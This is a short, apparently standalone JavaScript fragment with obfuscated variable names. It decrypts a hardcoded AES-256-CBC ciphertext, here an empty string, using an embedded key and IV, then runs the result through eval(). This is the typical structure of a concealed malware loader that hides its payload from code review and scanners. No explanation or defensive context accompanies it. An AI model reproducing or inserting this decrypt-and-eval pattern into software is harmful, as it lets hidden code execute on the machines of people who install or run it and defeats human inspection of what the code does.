const ito = require('crypto');
const itinho = Buffer.from('0494b51d22e0cb94cdf218daeca01661fb2a3ac9ea8358fecae2a29aa0aa42a2', 'hex');
const octua = Buffer.from('cbc592064da03fd0a1d884fbaaf8754a', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
